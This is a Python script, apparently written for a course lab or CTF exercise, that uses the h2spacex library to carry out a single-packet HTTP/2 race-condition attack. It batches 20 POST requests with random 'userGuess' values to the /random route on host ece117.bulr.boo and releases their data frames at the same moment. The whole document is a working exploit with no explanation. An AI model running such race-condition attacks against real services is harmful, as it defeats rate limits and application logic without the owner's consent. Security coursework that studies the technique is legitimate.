from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import random

hostname = 'ece117.bulr.boo'
port = 443

# Initialize the connection with the actual hostname and port
h2_conn = H2OnTlsConnection(
    hostname=hostname,  # Change 'localhost' to the correct domain if hosted remotely
    port_number=port  # Use the server's actual port number
)

# Establish the connection
h2_conn.setup_connection()

# HTTP headers to mimic browser behavior
headers = """accept: */*
content-type: application/x-www-form-urlencoded
"""

# Function to generate a random guess number between 1 and 1,000,000,000
def generate_body(guess):
    return f"userGuess={guess}"

# Generate a list of stream IDs for sending multiple guesses
number_of_guesses = 20 # Set the number of guesses you want to make
stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=number_of_guesses)

all_headers_frames = []  # To store all header frames
all_data_frames = []  # To store all data frames

for s_id in stream_ids_list:
    # Generate a random guess for each request
    guess = random.randint(1, 1000000000)
    body = generate_body(guess)

    # Create header and data frames for each request
    header_frames, data_frame = h2_conn.create_single_packet_http2_post_request_frames(
        method='POST',
        headers_string=headers,
        scheme='https',
        stream_id=s_id,
        authority=hostname,  # Same as hostname above
        body=body,
        path='/random'  # Ensure this matches the server's route for guesses
    )
    
    # Append frames to lists
    all_headers_frames.append(header_frames)
    all_data_frames.append(data_frame)

# Concatenate all header frames and send them in one go
temp_headers_bytes = b''.join(bytes(h) for h in all_headers_frames)
h2_conn.send_frames(temp_headers_bytes)

# Sleep briefly to simulate user delay and prevent overload
sleep(0.1)

# Send a ping to keep the connection alive (optional)
h2_conn.send_ping_frame()

# Concatenate all data frames and send them in one go
temp_data_bytes = b''.join(bytes(d) for d in all_data_frames)
h2_conn.send_frames(temp_data_bytes)

# Read and parse the server responses
resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)

# Display the response of each request
frame_parser.show_response_of_sent_requests()

# Close the connection gracefully
h2_conn.close_connection()
